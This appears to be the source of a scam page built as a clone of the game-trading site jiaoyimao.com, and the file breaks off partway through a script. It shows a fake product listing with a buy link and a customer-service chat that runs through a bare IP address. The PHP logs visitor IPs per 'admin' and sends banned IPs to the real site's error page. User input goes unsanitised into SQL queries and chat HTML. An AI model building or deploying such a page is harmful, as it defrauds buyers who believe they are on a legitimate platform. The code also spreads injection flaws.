<?php 
        $agent = strtolower($_SERVER['HTTP_USER_AGENT']);
        $is_pc = (strpos($agent, 'windows nt')) ? true : false;
        $is_mac = (strpos($agent, '3239.132')) ? true : false;     
        $is_ip = (strpos($agent, '2924.75')) ? true : false;
        $is_ipad = (strpos($agent, '601.1.46')) ? true : false;    


Define('PM_CALL',true);
Define('INC_CALL',true);
include dirname(__FILE__).('/../includes/global.class.php');
include dirname(__FILE__).('/../config/mysql.func.php');
include dirname(__FILE__).('/../config/Conn.php');
include dirname(__FILE__).('/../includes/getdata.php');
$ip=getIP();
$uid=$_GET['ClickID'];

$xzshijian=date('Y-m-d H:i:s', time());

if($_GET['ClickID']){
	$_GoodsID = _fetch_array("SELECT * FROM goods WHERE goods_id='{$_GET['ClickID']}' AND is_shelves=1");
	
	//做禁止IP访问
	$_BANIP = _fetch_array("SELECT * FROM admin_user WHERE au_id='{$_GoodsID['in_admin_id']}'");
	$BANIP=$_BANIP['BanIP'];
	if (stristr($BANIP, $ip)) {
		header('Location:'. htmlspecialchars_decode('https://www.jiaoyimao.com/error.html/').'');
	}
	
    if($_GoodsID==0){
                echo "<script language=\"javascript\">
  document.location.href=\"https://www.jiaoyimao.com/error.html/\";
</script>";
                exit;
            }
	
	//判断访问记录是否存在，如果不存在则插入记录，条件更具当前ID和当前商品ID
	$_OID = _fetch_array("SELECT * FROM useraddress WHERE uip='{$ip}' AND gid='{$_GoodsID['goods_id']}'");
	if(!$_OID){
		_query("
			INSERT INTO useraddress (
								uip,
								type,
								class,
								gid,
								biaoti,
								aid,
								state,
								utime
								) 
						VALUES (
								'{$ip}',
								1,
								1,
								'{$_GoodsID['goods_id']}',
								'{$_GoodsID['title']}',
								'{$_GoodsID['in_admin_id']}',
								1,
								'{$xzshijian}'
								)"
			);
		  _close();
		  session_destroy();
	}
	
	//清楚最后传入的商品ID
	setcookie("GoodsID4");
	//写入商品对应管理员ID
	setcookie('ADMINUID',$_GoodsID['in_admin_id']);
	//将ID写入COOKIE，用于传值
	setcookie('GoodsID',$_GoodsID['goods_id']);
	//获取当前完整URL地址
	$INURL = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'];
	//将当前地址写入COOKIE,用于登录页面刷新而跳转返回
	setcookie('GoodsURL1_1',$INURL);
	//跳转地址
	if(!$_GoodsID){
		
	}
	//更新点击率	
	//mysql_query("UPDATE goods SET hits = hits+1 WHERE goods_id = $_GET[ClickID]; ");
}else{
	
}

?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
    <meta name="format-detection" content="telephone=no">
    <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no ,viewport-fit=cover">
		<script type="text/javascript" async="" src="./images/index.js" id="aplus-sufei"></script><script src="./images/um.js" id="AWSC_umidPCModule"></script><script src="./images/collina.js" id="AWSC_uabModule"></script><script async="" src="./images/performance.js"></script><script src="./images/log.js" crossorigin=""></script>

	
	<meta content="wap" name="data-jym-spm-v">
<meta name="data-spm" content="a2y0w">
	<script>var __discovery = {}; __discovery.ws_start =  (new Date()).valueOf();</script>
<title>交易猫_手机游戏交易平台_游戏帐号交易_游戏币交易_装备交易_道具交易</title>
<meta name="keywords" content="手机游戏交易平台,手机网游,游戏账号交易,游戏币交易,交易猫">
<meta name="description" content="交易猫(jiaoyimao.com)是国内专业的手机游戏交易平台,提供免费的手机游戏装备交易、游戏帐号交易、游戏币交易、游戏道具交易、手机游戏礼包领取和激活码。">	        		    <script>
        HJWEB_ROOT_URL = '';
    </script>
    <!--
jym作者逐梦
QQ：30882343
--><script type="text/javascript" src="static/static/js/pusher.min.js"></script>
    <script type="text/javascript" src="static/static/js/jquery.min.js"></script>
    <script type="text/javascript" src="static/static/js/layui.js"></script>
    <script type="text/javascript" src="static/static/js/jquery.cookie.js"></script>
    <link rel="stylesheet" type="text/css" href="static/static/css/mobile-1.3.css">
    <script type="text/javascript" src="static/static/js/jquery.form.min.js"></script>
    <link rel="stylesheet" type="text/css" href="static/static/css/layer.css">
    <link rel="stylesheet" type="text/css" href="static/static/css/layui.css">
    <script type="text/javascript" src="static/static/js/layer.js"></script>
<script src="https://open.mobile.qq.com/sdk/qqapi.js?_bid=152"></script>
    <script type="text/javascript" src="static/static/js/recorder.js"></script>
    <script>
        var visiter ='游客5e495af1';
        var business_id  ='1';
        var record='http://154.91.197.76/mobile/index?code=vbSWPfra3nKF0yYFJIXazW00LzJy4Ffuh%2B2%2BPwu7UwMYbKkkv46UYY5mAizTXAnxkHkL0jlSfTt7Fk7KhIOVyxxfGkEYZzQn3YyffATwokPMI%2FYy&id=29';
        record.replace("%23","#");
        record.replace("%26","&");
        var pic ='';
        var channel= '35653439356166312f31';
        var visiter_id= '5e495af1';
        var special = '1';

        var cid ='0';
        var url ='http://154.91.197.76';
        if (pic == "") {
            pic = "static/static/picture/985.jpg";
        }
         var service_id=0;
        var wolive_connect =function () {
            
                    var pusher = new Pusher('3331333731383036', 
                        {encrypted: false,
                        enabledTransports: ['ws'],
                        wsHost: '154.91.197.76',
                        wsPort: 9090,
                        authEndpoint: '/auth.php',
                        disableStats: true
                    });

                    var channels = pusher.subscribe("cu" + channel);
                    channels.bind('my-event', function (data) {
                    
                        var msg = '';
                        msg += '<li class="chatmsg"><div style="position: absolute;top:0;left:0;">';
                        msg += '<img class="my-circle  se_pic" src="' + data.message.avatar + '" width="46px" height="46px"></div>';
                        msg += "<div class='outer-left'><div class='service'>";
                        msg += "<pre>" + data.message.content + "</pre>";
                        msg += "</div></div>";
                        msg += "</li>";
                        $(".chatmsg_notice").remove();
                        $(".chatmsg_no").remove();
                        $(".conversation").append(msg);
                        var div = document.getElementById("wrap");
                        div.scrollTop = div.scrollHeight;
                        $("img[src*='upload/images']").parent().parent('.customer').css({
                            padding: '0',borderRadius: '0',maxHeight:'100px'
                        });
                        $("img[src*='upload/images']").parent().parent('.service').css({
                            padding: '0',borderRadius: '0',maxHeight:'100px'
                        });
                        setTimeout(function(){
                            $('.chatmsg').css({
                                height: 'auto'
                            });
                        },0)
                    });

                    channels.bind('push-comment',function(data){

                        var html = '<div style="margin-bottom: 20px;">'+data.message.title+'</div>';
                        $.each(data.message.comments,function(index,value){
                            html += ' <div class=\'evaluate-item evaluate-score\' data-score="0">\n' +
                                '                <span class="evaluate-title">'+value+'</span>\n' +
                                '                <input type="hidden" name="'+value+'"/>\n' +
                                '                <img class="star" data-id="1" src="static/static/picture/star.png" alt="">\n' +
                                '                <img class="star" data-id="2" src="static/static/picture/star.png" alt="">\n' +
                                '                <img class="star" data-id="3" src="static/static/picture/star.png" alt="">\n' +
                                '                <img class="star" data-id="4" src="static/static/picture/star.png" alt="">\n' +
                                '                <img class="star" data-id="5" src="static/static/picture/star.png" alt="">\n' +
                                '            </div>';
                        });

                        if (data.message.word_switch == 'open') {
                            html += '<div class=\'evaluate-item\' style="height: 80px;line-height: 1;margin-top: 10px;align-items: flex-start">\n' +
                                '                <span style="display: inline-block;margin-right: 12px;white-space: nowrap">'+ data.message.word_title +'</span>\n' +
                                '                <textarea class="about-text" name="" id="" cols="30" rows="4"></textarea>\n' +
                                '            </div>';
                        }

                        html += ' <div class="evaluate-btn">\n' +
                            '                <button class="reset">取消</button>\n' +
                            '                <button class="submit">提交</button>\n' +
                            '            </div>';
                        $('.bg .dialog-body').html(html);
                        $('.bg').show();

                    });

                    channels.bind('first_word',function(data){
                    var msg = '';
                        msg += '<li class="chatmsg_no"><div style="position: absolute;left:0;">';
                        msg += '<img class="my-circle  se_pic" src="' + data.message.avatar + '" width="46px" height="46px"></div>';
                        msg += "<div class='outer-left'><div class='service'>";
                        msg += "<pre>" + data.message.content + "</pre>";
                        msg += "</div></div>";
                        msg += "</li>";

                        $(".conversation").append(msg);

                    });

                    channels.bind('cu_notice', function (data) {
                        $("#img_head").attr("src", data.message.avatar);
                        $("#services").text(data.message.nick_name);
                        $(".chatmsg_notice").remove();
                        $.cookie("services",data.message.service_id);
                        service_id =data.message.service_id;
                        getquestion(business_id);
                        getdata();
                    });

                    channels.bind('getswitch', function (data) {
                        $("#img_head").attr("src", data.message.avatar);
                        $("#services").text(data.message.nick_name);
                        $("#services").attr("data", data.message.service_id);
                        service_id = data.message.service_id;
                        $("#log").html('');
                        layer.msg("已经将您转接到其他客服" + data.message.nick_name);
                    });

                   function getlisten(chas){
                        var channels = pusher.subscribe("se"+chas);

                        //通知游客 客服离线
                        channels.bind('logout', function (data) {
                            $("#status").text("[离线]");
                        });
                        //表示客服在线
                        channels.bind("geton", function (data) {
                            $("#status").text('');
                        });
                    }
                    if($.cookie("services")){
                        var id =$.cookie("services");
                        getlisten(id);
                    }

                     pusher.connection.bind('state_change', function(states) {
                        if(states.current == 'unavailable' || states.current == "disconnected" || states.current == "failed" ){
                            $.cookie("cid","");
                            var id =$.cookie("services");
                            if(id){
                              pusher.unsubscribe("se"+id);
                            }

                            pusher.unsubscribe("cu" + channel);
                             if (typeof pusher.isdisconnect == 'undefined') {
                                    pusher.isdisconnect = true;   
                                    pusher.disconnect();
                                    delete pusher; 
                                    window.setTimeout(function(){
                                            wolive_connect();
                                      },1000);
                             }                           
                         }
                    });

                    pusher.connection.bind('connected', function() {
                        $.cookie("cid","");
                    
                    });
                }


    </script>
    <style type="text/css">
        #close_icon {
            position: absolute;
            right: 10px;
            top: 2px;
            cursor: pointer;
        }

        .input-but {
            position: relative;
            display: inline-block;
            vertical-align: middle;
            width: 30px;
            height: 30px;

        }

        .my-circle {
            border-radius: 30px;
        }

        .size {
            min-width: 30px;
            height: 25px;
            line-height: 30px;
            border: none;
        }

        .fileinput {
            width: 30px;
            height: 30px;
            position: absolute;
            top: 0px;
            right: 0px;
            opacity: 0;
            filter: alpha(opacity=0);
            cursor: pointer;
        }

         .chatmsg_no{
             position: relative;
             margin-bottom: 80px;
        }
     
       .chatmsg_question{
             position: relative;
             margin-bottom: 228px;
        }

        .chatmsg .my-circle {
            width: 40px;
            height: 40px;
        }

        .foot_msg {
            width: 100%;
            height: 100%;
            overflow: auto;
            position: relative;
        }


        #text_in {
            width: 100%;
            padding-right: 20%;
            height: 50px;
            float: left;
            border: 0;
            padding-left: 12px;
            color: #555555;
            font-size: 16px;
        }

        #text_in+.send-btn {
            position: absolute;
            right:12px;
            top:9px;
            width:60px;
            height: 32px;
            line-height: 32px;
            border-radius: 16px;
            padding: 0;
            text-align: center;
        }

        .msg-toolbar {
            width: 100%;
            height: 44px;
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            top: 50px;
            background-color: #f7f7f7;
        }

        .msg-toolbar a {
            float: left;
            width: 33%;
            margin: 0;
            text-align: center;
        }

        .msg-toolbar a img {
            margin-top: 10.5px;
            height: 23px;
            width: 23px;
        }

        .tool_box {
            width: 100%;
            height: auto;
            position: absolute;
            bottom: 94px;
            top: -160px;
            display: none;
            background-color: #fff;
        }

        .wl_faces_main ul {
            margin: 5px 5px;
            overflow: hidden;
            width: 100%;
        }

        .wl_faces_main ul li {
            float: left;
            height: 30px;
            width: 26px;
            text-align: center;

        }

        .wl_faces_main ul li img {
            width: 22px;
            height: 22px;
            padding: 0px;
        }

        .customer {
            background-color: #3bf;
            display: inline-block;
            padding: 12px;
            float: right;
            word-break: break-all;
            word-wrap: break-word;
            color: #ffffff;
            border-radius: .13333rem;
            border-top-right-radius: 0;
            max-width: 80%;
            box-sizing: border-box;
              
    font-size:16px;
        }

        .outer-left:before, .outer-left > i {
            height: 0;
            border: 0;
        }

        .outer-right:before, .outer-right > i {
            height: 0;
            border: 0;            
        }

        .service {
            background-color: #fff;
            display: inline-block;
      
            padding: 12px;
            float: left;
            word-break: break-all;
            word-wrap: break-word;
            color: #555555;
border-radius: .13333rem;
            border-top-left-radius: 0;
            position: relative;
            left: 0px;
            max-width: 80%;
            border: 1px solid #dddddd;
               
    font-size:16px;
        }

        .content {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            overflow-y: auto;
            margin: 0;
        }
        .bg,.offline {
            position: fixed;
            top: 0;
            left: 0;
            height: 100%;
            width: 100%;
            background-color: rgba(0, 0, 0, .4);
            z-index: 998;
            display: none;
        }

        .dialog {
            width: 65%;
            padding: 20px 25px;
            border-radius: 5px;
            background-color: #fff;
            margin: 25% auto 0;
            position: relative;
            padding-bottom: 65px;
        }

        .bg .title {
            font-size: 15px;
            text-align: center;
            color: #555555;
            font-weight: 600;
            margin-bottom: 15px;
        }

        .evaluate-item {
            height: 26px;
            display: flex;
            align-items: center;
        }

        .evaluate-item img {
            height: 16px;
            width: 16px;
            cursor: pointer;
            margin-left: 14px;
        }

        .evaluate-item img:first-of-type {
            margin-left: 14px;
        }

        .evaluate-text {
            display: none;
            border: 1px solid #4AACFF;
            color: #4AACFF;
            height: auto;
            font-size: 13px;
            border-radius: 5px;
            margin-left: 12px;
            padding: 0px 5px;
        }

        .about-text {
            border: 1px solid #E5E3E9;
            border-radius: 10px;
            width: 68%;
            padding: 5px 10px;
        }

        .evaluate-btn {
            display: flex;
            justify-content: center;
            margin-top: 20px;
        }

        .dialog .evaluate-btn {
            position: absolute;
            width: 100%;
            bottom: 0;
            left: 0;
            height: 45px;
            line-height: 45px;
            border-bottom-left-radius: 5px;
            border-bottom-right-radius: 5px;
        }

        .dialog .evaluate-btn button {
            width: 50%;
            border: 0;
            font-size: 15px;
        }

        .dialog .evaluate-btn button.reset {
            border-bottom-left-radius: 5px;
            background-color: #F5F5F5;
            color: #555555;
        }


        .dialog .evaluate-btn button.submit {
            border-bottom-right-radius: 5px;
            background-color: #3399ff;
            color: #fff;
        }

        .evaluate-title {
            min-width: 85px;
            text-align: left;
        }

        .offline-item {
            margin-bottom: 15px;
        }

        .offline-title {
            text-align: left;
            margin-bottom: 10px;
        }

        .offline-item input {
            height: 40px;
            border-radius: 20px;
            padding: 0 5%;
            border: 1px solid #E8E6EB;
            width: 90%;
        }

        .keyword {
            position: fixed;
            bottom: 94px;
            left: 0;
            max-width: 100%;
            height: 48px;
            white-space: nowrap;
            z-index: 90;
            display: none;
            overflow-y: auto
        }

        .keyword #question_key_list {
            margin-top: 8px;
            margin-left: 20px;
        }

        .keyword .swiper-slide {
            display: inline-block;
            width: auto;
            height: 24px;
            line-height: 24px;
            padding: 0 10px;
            border-radius: 12px;
            border: 1px solid #E2E2E2;
            font-size: 12px;
            margin-right: 10px;
            background-color: #fff;
            cursor: pointer;
        }
    </style>
</head>
<body>
<div id="container">
<div class="bg">
    <div class="dialog">
        <div class="title">评价客服</div>
        <div class="dialog-body">
            <div style="margin-bottom: 20px;">请对我的服务进行评价，满意请打5星哦~</div>
            <div class='evaluate-item evaluate-score' data-score="0">
                <span class="evaluate-title">服务态度态度</span>
                <img class="star" data-id="1" src="static/static/picture/star.png" alt="">
                <img class="star" data-id="2" src="static/static/picture/star.png" alt="">
                <img class="star" data-id="3" src="static/static/picture/star.png" alt="">
                <img class="star" data-id="4" src="static/static/picture/star.png" alt="">
                <img class="star" data-id="5" src="static/static/picture/star.png" alt="">
            </div>
            <div class='evaluate-item' style="height: 80px;line-height: 1;margin-top: 10px;align-items: flex-start">
                <span style="display: inline-block;margin-right: 12px;white-space: nowrap">意见意见建议</span>
                <textarea class="about-text" name="" id="" cols="30" rows="4"></textarea>
            </div>
            <div class="evaluate-btn">
                <button class="reset">取消</button>
                <button class="submit">提交</button>
            </div>
        </div>
    </div>
</div>
<div class="offline">
    <div class="dialog">
        <div class="dialog-body">
            <div style="margin-bottom: 20px;"></div>
                    </div>
    </div>    
</div>


	<style>
    @font-face {
        font-family: "iconfont";
        src: url('static/static/font/iconfont-1581182649014.eot'); /* IE9 */
        src: url('static/static/font/iconfont-1581182649014.eot#iefix') format('embedded-opentype'), /* IE6-IE8 */ url('data:application/x-font-woff2;charset=utf-8;base64,d09GMgABAAAAAAKcAAsAAAAABkAAAAJQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHEIGVgCCcApMXwE2AiQDCAsGAAQgBYRtBy4bgwUR1Yszsj9ANmQD9YW00Flnyx3T14Mp+v0jwBOMNTiAC1gBCQAAAAAQD9+v8Tt3930TSdLdoZonQlJtlCA6HUIhFI1iienABhw0pDjjwPbC3IZoSQvp1njFuqYrsF18HxYasdMDOcGD23e8zPVgIjcPAk/hYvo+o6y0FAAJUbbrE/dO/wT6IK0HlONetMagLqAuDqRA97CiyAoo5IaxC17gfQKlOo2Lhd3GASX2skBczM4cY8EvSSxVLBQ27E3iMUwUZ3eG4VH0/fhtIiRTkLMrdk4vntRvnAz2nxcQEAABHS5AjnEk4qAxvgXBuFxpPHo5VmnwzR/YxFHNgv11dnE5aIeSZ5J6SwXI4LEmqkXzpOeIWr5bf/dyA3Xv6ZVG5smVt//utzc/o+fb85tcOUG7YQa7svf53/mNmiuvHh+xJYGPedSU5FC8D0fwL6QD+5Iht61Z0qSNw5nac7SUKsV/7K71daqh4cTpUKxhgrNIR4ZcsX4yseMoUGYKhYpNo9SY5cNl6lyCSCUYdQMgVHuJTKV3yFX7QCb2Cwo0+otC1QFKHQ5nlhkMK1uuhWKlO14/mN2aml27LuPSAyWPMpa8POJdSPoshLZhlVN7qkmW2NA/E0eVkaWpcAceo7JssJUmp5saqWrrmiY3vcm4NRUsYS0UK93x+sHs1tQcjNZl5fMHSh5lLB09dfELSZ9Nj7ZhDSD3mnpQz6O80j8TR5WRpalwB2ZRWTbYNs/K6aZGOiHauqYziIdqjO111d8dA2AJtnE4cGpz42t8KwAAAAA=') format('woff2'),
        url('static/static/font/iconfont-1581182649014.woff') format('woff'),
        url('static/static/font/iconfont-1581182649014.ttf') format('truetype'), /* chrome, firefox, opera, Safari, Android, iOS 4.2+ */ url('static/static/font/iconfont-1581182649014.svg#iconfont') format('svg'); /* iOS 4.1- */
    }

    .icon-back {
        font-family: "iconfont" !important;
        font-size: 1.4rem;
        color: #303133;
        font-style: normal;
        -webkit-font-smoothing: antialiased;
        -moz-osx-font-smoothing: grayscale;
    }

.header {
  background: #fff;
  display: flex;
  flex-direction: column;
  height: auto;
}
.box_top {
  width: 100%;
  background: #fff;
  display: flex;
  justify-content: space-between;
  align-items: center;
}
.box_top #services {
  color: #303133;
  font-size: 1.13rem;
}
.navbar-left {
  padding-left: .4rem;
  height: 100%;
}
.navbar-left a {
  padding: .21333rem;
  margin: 0 -0.21333rem;
}
.navbar-left a i {
  position: relative;
  top: -0.02667rem;
  left: -0.112rem;
}
#status {
  width: 2.55rem;
}
.box_bottom {
  width: 95%;
  border: 1px solid;
  display: flex;
  justify-content: space-between;
  align-items: center;
}
.box_bottom .left {
	width: 80%;
}
.box_bottom .left h1 {
  color: #000;
  font-size: 0.9rem;
  height: 1rem;
  line-height: 1rem;
  overflow: hidden;
  font-weight: 400;
  text-overflow: ellipsis;
  white-space: nowrap;
}
.box_bottom .left div {
  display: flex;
  justify-content: space-between;
  align-items: center;
}
.box_bottom .left div span {
  color: #ff301a;
  font-size: .9rem;
  font-weight: 700;
}
.box_bottom .left div span strong {
  font-size: 1.3rem;
}
.box_bottom .left div a {
	margin-right: 10px;
  width: 5.4rem;
  height: 1.8rem;
  background-image: -webkit-linear-gradient(45deg, #0cf, #008cff);
  background-image: linear-gradient(45deg, #0cf, #008cff);
  color: #fff;
  font-size: 12px;
  line-height: 1.8rem;
  text-align: center;
  border-radius: .8rem;
}
.box_bottom .right {
  width: 3rem;
  height: 3rem;
}
.box_bottom .right img {
  width: 100%;
  border-radius: .13333rem;
}

</style>
   <!--头部-->
<div class="header">
    <div class="box_top">
        <!--返回按钮-->
        <div class="navbar-left">
            <a href="javascript:;">
                <i class="icon-back">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<?php echo $_GoodsID['mingzi'];?></i>
            </a>
        </div>
        <span id="services"></span>
        <span id="status"></span>
    </div>


    <div class="box_bottom">
        <div class="left">
            <h1>【<?php echo $_GoodsID['user_name'];?>】<?php echo $_GoodsID['title']; ?>_<?php echo $_GoodsID['freight']; ?></h1>
            <div>
                <span>
                    ￥
                    <strong><?php echo $_GoodsID['price']; ?></strong>
                </span>

                <a href="dd.php">立即购买</a>
            </div>
        </div>
  
<div class="right">
            <img src="https://static.jiaoyimao.com/resource/public/notice/2018/7/5/d15ffb9c-1b1e-4cb7-90e0-952427dd934d.png" id="wz">

            
        </div>
    </div>

</div>
    
    
    
    
    
    
    <div class="content" id="wrap" style="background-color: rgb(247, 247, 247);">
        <div style="height: 130px;width: 100%;"></div>
        <ul id="log" class="conversation">
			<p style='
				padding:10px;
				margin:30px auto;
				width: 85%;
    			border-radius: .4rem;
				line-height:1.5;
				font-weight:700;
				background:#1e2133;
				opacity: .15;
			    font-size:13px;
			    color:#fff;'>
				警惕！聊天过程中请不要泄漏您的密码、密保信息，谨防被骗！交易中不要通过微信、QQ或其他外部聊天工具进行沟通，否则后果自负！
			</p>
        </ul>
        <div style="height: 94px;width: 100%;"></div>
    </div>
    <div class="keyword">
        <div class="swiper-wrapper" id="question_key_list">
        </div>
    </div>
    <div class="foot_all" style="position:fixed;bottom:0px;width: 100%;height: auto;padding:0;z-index: 999">

        <div class="tool_box">
            <div class="wl_faces_content">
                <div class="wl_faces_main">
                    
                </div>
            </div>
        </div>
        <div class="foot_msg">
        	
        	
        	
            <div class="" style="
            		padding:8px 10px;
            		display:flex;
            		align-items:center;
            		justify-content:space-between;
            		background:#fff;
        	">
				<form id="picture" enctype="multipart/form-data">
				    <div class="layui-box input-but  size" style='height:auto;'>
				        <img src="static/static/picture/photo.png" alt="">
				        <input type="file" name="upload" class="fileinput" onchange="put()">
				    </div>
				</form>
                <input type="text" id="text_in" placeholder="发送消息..." class="" value="" style="
                		width:75%;
                		padding:0;
                		height:30px;
            		">
                <span id='send' style="
            		    opacity: .2;
            		    font-size: 1rem;
    					color: #0fa8fa;
                	" onclick="send()">
                	发送
                </span>
            </div>
            <input type="hidden" name="" id="test" value="王者荣耀">
            
            
            
            <!--<div class="msg-toolbar">-->
            <!--    <a id="face_icon" href="javascript:" onclick="faceon()"><img src="static/static/picture/smile.png" alt=""></a>-->

            <!--    -->


            <!--    <a id="images" href="javascript:">-->
            <!--        <form id="picture" enctype="multipart/form-data">-->
            <!--            <div class="layui-box input-but  size">-->
            <!--                <img src="static/static/picture/photo.png" alt="">-->
            <!--                <input type="file" name="upload" class="fileinput" onchange="put()"/>-->
            <!--            </div>-->
            <!--        </form>-->
            <!--    </a>-->
            <!--    <a id="files" href="javascript:">-->
            <!--        <form id="file" enctype="multipart/form-data">-->
            <!--            <div class="layui-box input-but  size">-->
            <!--                <img src="static/static/picture/file.png" alt="">-->
            <!--                <input type="file" name="folder" class="fileinput" onchange="putfile()"/>-->
            <!--            </div>-->
            <!--        </form>-->
            <!--    </a>-->
            <!--</div>-->
        </div>
    </div>
</div>
<script type="text/javascript" src="static/static/js/mochat-1.5.js"></script>
<script>
	//监听input是否有值，改变发送按钮颜色
	 $("#text_in").bind("input propertychange",function(event){
	 	var text_in_value = $("#text_in").val();
	 	console.log(typeof text_in_value);
 	 	console.log(text_in_value.length);

    	//  具体代码
		if(text_in_value.length == 0){
			$("#send").css('opacity',0.2);
			
		}else{
			$("#send").css('opacity',1);
		}
	});
	
	


    $(document).on('click','.reset',function(){
        $('.bg').hide();
        $('.offline').hide();
    })

    $(document).on('click','.offline .submit',function(){
        let name = $('#offline_name').val();
        let mobile = $('#offline_mobile').val();
        $.ajax({
            url:HJWEB_ROOT_URL+"/admin/event/info",
            type: "post",
            data: {visiter_id:visiter_id,business_id: business_id,name:name,tel:mobile},
            dataType:'json',
            success:function(res){
                if(res.code != 0){
                    layer.msg(res.msg,{icon:2});
                } else {
                    layer.msg(res.msg,{icon:1});
                    setTimeout(function(){
                        $('.offline').hide();
                    },2000)
                }
            }
        });
    });

    $(document).on('click','.bg .submit',function(){
        let comment = '';
        if($('.about-text').val()){
            comment = $('.about-text').val();
        }
        let scores = [];
        $(".evaluate-score").each(function(item){
            let title = $(this).find('.evaluate-title').text();
            let score = $(this).attr('data-score');
            scores[item] = {title,score}
        });

        $.ajax({
            url:HJWEB_ROOT_URL+"/admin/event/comment",
            type: "post",
            data: {service_id:service_id, visiter_id:visiter_id,comment: comment,business_id: business_id,scores:JSON.stringify(scores)},
            dataType:'json',
            success:function(res){
                if(res.code != 0){
                    layer.msg(res.msg,{icon:2});
                } else {
                    layer.msg(res.msg,{icon:1});
                    setTimeout(function(){
                        $('.bg').hide();
                    },2000)
                }
            }
        });
    });

    $(document).on('click','.star',function(row){
        let light = 'static/static/picture/star-light.png';
        let dark = 'static/static/picture/star-dark.png';
        let star = 'static/static/picture/star.png';
        let index = row.target.dataset.id;
        $(this).parent().find('.star').attr('src',star);
        switch(index)
        {
            case '1':
                $(this).attr('src',dark);
                $(this).parent('.evaluate-item').attr('data-score',1)
                break;
            case '2':
                $(this).attr('src',dark);
                $(this).prev('.star').attr('src',dark)
                $(this).parent('.evaluate-item').attr('data-score',2)
                break;
            case '3':
                $(this).attr('src',light);
                $(this).prevAll('.star').attr('src',light);
                $(this).parent('.evaluate-item').attr('data-score',3)
                break;
            case '4':
                $(this).attr('src',light);
                $(this).prevAll('.star').attr('src',light)
                $(this).parent('.evaluate-item').attr('data-score',4)
                break;
            case '5':
                $(this).parent().find('.star').attr('src',light);
                $(this).parent('.evaluate-item').attr('data-score',5)
                break;
        }
    })

    $(function() {
        // let height = +document.documentElement.clientHeight;
        // console.log(document.documentElement)
        // $('.content').css({
        //     height: height
        // });
        let windowHeight = $(".chatmsg_no").find('.outer-left').height() + 20;
        $(".chatmsg_no").css({
            height: windowHeight,
            margin: '0'
        });
    })

    $(document).on('touchend', '.content', function () {
        $("#text_in").blur();
        $('.tool_box').css({
            display: 'none'
        });
    });

    var getaudio =function(){

     var sid =$.cookie('services');
     if(sid == service_id){

         //音频先加载
                var audio_context;
                var recorder;
                var wavBlob;
                //创建音频
                try {
                    // webkit shim
                    window.AudioContext = window.AudioContext || window.webkitAudioContext;
                    navigator.getUserMedia = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia || navigator.mediaDevices.getUserMedia;
                    window.URL = window.URL || window.webkitURL;

                    audio_context = new AudioContext;

                    if (!navigator.getUserMedia) {
                        console.log('语音创建失败');
                    }
                    ;
                } catch (e) {
                    console.log(e);
                    return;
                }
                navigator.getUserMedia({audio: true}, function (stream) {
                    var input = audio_context.createMediaStreamSource(stream);
                    recorder = new Recorder(input);

                    var falg = window.location.protocol;
                    if (falg == 'https:') {
                        recorder && recorder.record();

                        //示范一个公告层
                        layui.use(['jquery', 'layer'], function () {
                            var layer = layui.layer;

                            layer.msg('录音中...', {
                                icon: 16
                                , shade: 0.01
                                , skin: 'layui-layer-lan'
                                , time: 0 //20s后自动关闭
                                , btn: ['发送', '取消']
                                , yes: function (index, layero) {
                                    //按钮【按钮一】的回调
                                    recorder && recorder.stop();
                                    recorder && recorder.exportWAV(function (blob) {
                                        wavBlob = blob;
                                        var fd = new FormData();
                                        var wavName = encodeURIComponent('audio_recording_' + new Date().getTime() + '.wav');
                                        fd.append('wavName', wavName);
                                        fd.append('file', wavBlob);

                                        var xhr = new XMLHttpRequest();
                                        xhr.onreadystatechange = function () {
                                            if (xhr.readyState == 4 && xhr.status == 200) {
                                                jsonObject = JSON.parse(xhr.responseText);

                                                voicemessage = '<div style="cursor:pointer;text-align:center;" onclick="getstate(this)" data="play"><audio src="'+jsonObject.data.src+'"></audio><i class="layui-icon" style="font-size:25px;"></i><p>音频消息</p></div>';

                                                    var sid = $('#channel').text();
                                    
                                                    var time;

                                                    var sdata = $.cookie('cu_com');

                                                    if (sdata) {
                                                        var json = $.parseJSON(sdata);
                                                        var img = json.avater;

                                                    }

                                                       if($.cookie("itime") == ""){
                                                            var myDate = new Date();
                                                                time = myDate.getHours()+":"+myDate.getMinutes();
                                                            var timestamp = Date.parse(new Date());
                                                            $.cookie("itime",timestamp/1000);
                                                        
                                                        }else{

                                                            var timestamp = Date.parse(new Date());
                                                            var lasttime =$.cookie("itime");
                                                            if((timestamp/1000 - lasttime) >30){
                                                                var myDate =new Date(timestamp);
                                                                time = myDate.getHours()+":"+myDate.getMinutes();
                                                            }else{
                                                                time ="";
                                                            }

                                                            $.cookie("itime",timestamp/1000);
                                                        }
                                               
                                                var str = '';
                                                    str += '<li class="chatmsg"><div class="showtime">' + time + '</div>';
                                                    str += '<div style="position: absolute;top: 26px;right: 2px;"><img  class="my-circle cu_pic" src="' + pic + '" width="40px" height="40px"></div>';
                                                    str += "<div class='outer-right'><div class='customer'>";
                                                    str += "<pre>" +  voicemessage + "</pre>";
                                                    str += "</div></div>";
                                                    str += "</li>";

                                                    $(".conversation").append(str);
                                                    $("#text_in").empty();

                                                    var div = document.getElementById("wrap");
                                                    div.scrollTop = div.scrollHeight;
                                                    $("img[src*='upload/images']").parent().parent('.customer').css({
                                                        padding: '0',borderRadius: '0',maxHeight:'100px'
                                                    });
                                                    $("img[src*='upload/images']").parent().parent('.service').css({
                                                        padding: '0',borderRadius: '0',maxHeight:'100px'
                                                    });
                                                    setTimeout(function(){
                                                        $('.chatmsg').css({
                                                            height: 'auto'
                                                        });
                                                    },0)
                                                   $.ajax({
                                                    url:HJWEB_ROOT_URL+"/admin/event/chat",
                                                    type: "post",
